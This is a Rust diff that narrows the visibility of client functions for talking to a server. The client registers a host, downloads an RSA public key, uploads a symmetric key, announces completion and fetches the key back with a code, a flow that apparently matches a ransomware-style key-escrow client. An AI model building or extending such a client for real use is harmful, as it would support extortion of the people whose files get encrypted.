@@ -20,7 +20,7 @@ use tracing::{debug, info};
 use crate::{config, crypto::decrypt_string, status::Status};
 
 #[derive(Clone, Debug)]
-pub struct ServerConn {
+pub(crate) struct ServerConn {
     pub fqdn: String,
     pub port: u16,
     pub https: bool,
@@ -28,7 +28,12 @@ pub struct ServerConn {
 }
 
 impl ServerConn {
-    pub fn new(fqdn: impl Into<String>, port: u16, https: bool, verify_server: bool) -> Self {
+    pub(crate) fn new(
+        fqdn: impl Into<String>,
+        port: u16,
+        https: bool,
+        verify_server: bool,
+    ) -> Self {
         Self {
             fqdn: fqdn.into(),
             port,
@@ -37,7 +42,7 @@ impl ServerConn {
         }
     }
 
-    pub fn from_config() -> Self {
+    pub(crate) fn from_config() -> Self {
         Self::new(
             config::SERVER_FQDN.as_str(),
             config::SERVER_PORT,
@@ -67,7 +72,7 @@ fn post_json<T: Serialize>(
     }
 }
 
-pub fn write_asym_pub_key_to_disk(
+pub(crate) fn write_asym_pub_key_to_disk(
     asym_pub_key: &BoxedRsaPublicKey,
     file_path: &Path,
 ) -> anyhow::Result<()> {
@@ -77,7 +82,7 @@ pub fn write_asym_pub_key_to_disk(
     Ok(())
 }
 
-pub fn download_asym_pub_key(conn: &ServerConn) -> anyhow::Result<BoxedRsaPublicKey> {
+pub(crate) fn download_asym_pub_key(conn: &ServerConn) -> anyhow::Result<BoxedRsaPublicKey> {
     let url = conn.base_url(routes::ASYM_PUB_KEY_PATH.as_str());
     debug!(url, "Asymmetric public key download URL");
     let content = web_get_recv_bytes(&url, conn.verify_server)?;
@@ -85,7 +90,7 @@ pub fn download_asym_pub_key(conn: &ServerConn) -> anyhow::Result<BoxedRsaPublic
     BoxedRsaPublicKey::from_spki_pem(pem).context("failed to parse PEM public key")
 }
 
-pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
+pub(crate) fn register(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
     let url = conn.base_url(routes::REGISTER.as_str());
     let proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
     let registration = Registration {
@@ -96,7 +101,11 @@ pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Res
     post_json(&url, &registration, conn.verify_server, "registration")
 }
 
-pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
+pub(crate) fn upload_sym_key(
+    conn: &ServerConn,
+    status: &Status,
+    secret: &str,
+) -> anyhow::Result<()> {
     let url = conn.base_url(routes::UPLOAD_SYM_KEY.as_str());
     let proof_source = [
         status.id.as_bytes(),
@@ -113,7 +122,11 @@ pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> anyho
     Ok(())
 }
 
-pub fn announce_completion(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
+pub(crate) fn announce_completion(
+    conn: &ServerConn,
+    status: &Status,
+    secret: &str,
+) -> anyhow::Result<()> {
     let url = conn.base_url(routes::ANNOUNCE_COMPLETION.as_str());
     let proof_source = status.id.as_bytes().to_vec();
     let announce_completion = AnnounceCompletion {
@@ -151,7 +164,7 @@ fn download_sym_key(
 }
 
 #[tracing::instrument(skip_all)]
-pub fn fetch_sym_key(
+pub(crate) fn fetch_sym_key(
     conn: &ServerConn,
     status: &Status,
     code: &str,
